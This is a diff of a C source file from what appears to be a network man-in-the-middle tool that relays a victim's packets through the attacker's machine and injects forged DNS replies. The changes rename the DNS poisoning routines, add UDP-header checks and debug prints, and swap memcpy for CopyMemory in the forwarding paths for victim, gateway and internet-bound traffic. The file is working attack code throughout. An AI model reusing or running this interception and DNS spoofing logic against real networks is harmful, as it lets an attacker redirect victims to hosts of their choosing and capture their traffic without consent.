@@ -12,8 +12,9 @@
 #include "LinkedListFirewallRules.h"
 #include "LinkedListSpoofedDnsHosts.h"
 #include "DnsPoisoning.h"
-#include "DnsRequestPoisoning.h"
-#include "DnsResponsePoisoning.h"
+#include "DnsHelper.h"
+#include "DnsRequestSpoofing.h"
+#include "DnsResponseSpoofing.h"
 #include "HttpPoisoning.h"
 #include "PacketProxy.h"
 
@@ -125,7 +126,6 @@ void PacketForwarding_handler(u_char *param, const struct pcap_pkthdr *pktHeader
            packetInfo.proto, packetInfo.srcIp, packetInfo.srcPort, packetInfo.dstIp,
            packetInfo.dstPort, packetInfo.pktLen, packetInfo.suffix);
 
-
   // Firewall checks
   if ((firewallRule = FirewallBlockRuleMatch(gFWRulesList, packetInfo.proto, packetInfo.srcIpBin, packetInfo.dstIpBin, packetInfo.srcPort, packetInfo.dstPort)) != NULL)
   {
@@ -164,14 +164,17 @@ void ProcessData2Internet(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
 
   // In case user sends DNS request to an external DNS server, send back
   // a spoofed answer packet.
-  if ((tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
+// DnsResponsePoisonerGetHost2Spoof
+  if (packetInfo->udpHdr != NULL &&
+      (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
   {
-    InjectDnsPacket(packetInfo->pcapData, (pcap_t *)scanParams->interfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
+printf("DNSPOISONG.ProcessData2Internet(): |%s| -> |%s|\n", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
+    DnsRequestSpoofing(packetInfo->pcapData, (pcap_t *)scanParams->interfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
     return;
   }
 
-  memcpy(packetInfo->etherHdr->ether_dhost, scanParams->gatewayMacBin, BIN_MAC_LEN);
-  memcpy(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
+  CopyMemory(packetInfo->etherHdr->ether_dhost, scanParams->gatewayMacBin, BIN_MAC_LEN);
+  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
   LogMsg(DBG_INFO, packetInfo->logMsg, "OUT");
 
   pcap_sendpacket(((pcap_t *)scanParams->interfaceWriteHandle), packetInfo->pcapData, packetInfo->pcapDataLen);
@@ -184,14 +187,16 @@ void ProcessData2Victim(PPACKET_INFO packetInfo, PSYSNODE realDstSys, PSCANPARAM
   PHOSTNODE tmpNode = NULL;
   char spoofedDnsPacket[8192] = { 0 };
   int spoofedDnsPacketLen = 0;
-
-  memcpy(packetInfo->etherHdr->ether_dhost, realDstSys->data.sysMacBin, BIN_MAC_LEN);
-  memcpy(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
+  
+  CopyMemory(packetInfo->etherHdr->ether_dhost, realDstSys->data.sysMacBin, BIN_MAC_LEN);
+  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
   LogMsg(DBG_INFO, packetInfo->logMsg, "IN");
 
   // DNS RESPONSE SPOOFING
-  if ((tmpNode = (PHOSTNODE)DnsResponsePoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
+  if (packetInfo->udpHdr != NULL && 
+      (tmpNode = (PHOSTNODE)DnsResponsePoisonerGetHost2Spoof(packetInfo->pcapData)) != NULL)
   {
+printf("DNSPOISONG.ProcessData2Victim():  %s -> %s\n", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
     spoofedDnsPacketLen = sizeof(spoofedDnsPacket);
     BuildSpoofedDnsReplyPacket(packetInfo->pcapData, packetInfo->pcapDataLen, tmpNode, spoofedDnsPacket, &spoofedDnsPacketLen);
     if (pcap_sendpacket((pcap_t *)scanParams->interfaceWriteHandle, (unsigned char *)spoofedDnsPacket, spoofedDnsPacketLen) == 0)
@@ -202,8 +207,8 @@ void ProcessData2Victim(PPACKET_INFO packetInfo, PSYSNODE realDstSys, PSCANPARAM
   }
 
   pcap_sendpacket((pcap_t *)scanParams->interfaceWriteHandle, packetInfo->pcapData, packetInfo->pcapDataLen);
-
 }
+
 
 
 void ProcessData2GW(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
@@ -211,17 +216,20 @@ void ProcessData2GW(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
   PHOSTNODE tmpNode = NULL;
 
   // DNS REQUEST SPOOFING
-  if ((tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof((u_char *)packetInfo->pcapData)) != NULL)
+  if (packetInfo->udpHdr != NULL && 
+      (tmpNode = (PHOSTNODE)DnsRequestPoisonerGetHost2Spoof((u_char *)packetInfo->pcapData)) != NULL)
   {
-    InjectDnsPacket((unsigned char *)packetInfo->pcapData, (pcap_t *)scanParams->interfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
+printf("DNSPOISONG.ProcessData2GW(): |%s| -> |%s|\n", tmpNode->sData.HostName, tmpNode->sData.SpoofedIP);
+    DnsRequestSpoofing((unsigned char *)packetInfo->pcapData, (pcap_t *)scanParams->interfaceWriteHandle, (char *)tmpNode->sData.SpoofedIP, (char *)packetInfo->srcIp, (char *)packetInfo->dstIp, (char *)tmpNode->sData.HostName);
     return;
   }
 
-  memcpy(packetInfo->etherHdr->ether_dhost, scanParams->gatewayMacBin, BIN_MAC_LEN);
-  memcpy(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
+  CopyMemory(packetInfo->etherHdr->ether_dhost, scanParams->gatewayMacBin, BIN_MAC_LEN);
+  CopyMemory(packetInfo->etherHdr->ether_shost, scanParams->localMacBin, BIN_MAC_LEN);
   LogMsg(DBG_INFO, packetInfo->logMsg, "GW");
   pcap_sendpacket(((pcap_t *)scanParams->interfaceWriteHandle), packetInfo->pcapData, packetInfo->pcapDataLen);
 }
+
 
 
 void ProcessFirewalledData(PPACKET_INFO packetInfo, PSCANPARAMS scanParams)
